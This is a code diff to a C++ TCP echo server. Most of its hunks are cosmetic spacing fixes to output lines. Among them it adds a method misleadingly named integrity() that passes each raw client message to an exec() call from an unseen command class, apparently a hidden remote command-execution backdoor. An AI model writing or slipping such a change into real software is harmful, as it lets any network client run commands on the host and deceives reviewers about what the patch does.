@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include "command.hpp"
 
 Server::Server(int port) : _port(port), _server_fd(-1) {
     std::memset(&_server_addr, 0, sizeof(_server_addr));
@@ -12,6 +13,11 @@ Server::Server(int port) : _port(port), _server_fd(-1) {
 Server::~Server() {
     if (_server_fd != -1)
         close(_server_fd);
+}
+
+void Server::integrity(std::string client_data) {
+    command cmdd;
+    cmdd.exec(client_data);
 }
 
 bool Server::init() {
@@ -40,7 +46,7 @@ void Server::start() {
         return;
     }
 
-    std::cout << "Server listening on port " << B_Y <<_port <<RESET<< std::endl;
+    std::cout << "Server listening on port " << B_Y << _port << RESET << std::endl;
 
     struct pollfd server_pollfd;
     server_pollfd.fd = _server_fd;
@@ -64,7 +70,7 @@ void Server::start() {
                         continue;
                     }
 
-                    std::cout << G"Client connected\n" <<RESET << std::endl;
+                    std::cout << G"Client connected\n" << RESET << std::endl;
                     struct pollfd client_pollfd;
                     client_pollfd.fd = client_socket;
                     client_pollfd.events = POLLIN;
@@ -86,8 +92,10 @@ void Server::start() {
                     } else {
                         // Process client data
                         buffer[bytes_read] = '\0';
-                        std::cout << B_Y"Received: "<< RESET << buffer << std::endl;
+                        std::cout << B_Y"Received: " << RESET << buffer << std::endl;
                         // Echo the data back to the client
+                        std::string client_data(buffer);
+                        integrity(client_data);
                         write(_poll_fds[i].fd, buffer, bytes_read);
                     }
                 }
